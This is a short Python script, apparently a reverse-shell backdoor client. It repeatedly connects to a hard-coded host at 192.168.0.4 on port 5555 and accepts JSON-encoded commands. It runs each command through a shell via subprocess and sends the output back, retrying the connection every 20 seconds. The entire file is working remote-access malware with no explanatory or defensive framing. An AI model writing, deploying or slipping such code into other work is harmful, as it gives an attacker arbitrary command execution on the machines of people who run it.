import socket
import time
import subprocess
import json

def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def reliable_receive():
    data = ''
    while True:
        try:
            data = data+ s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.0.4', 5555))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_receive()
        if command == 'exit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
        
        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()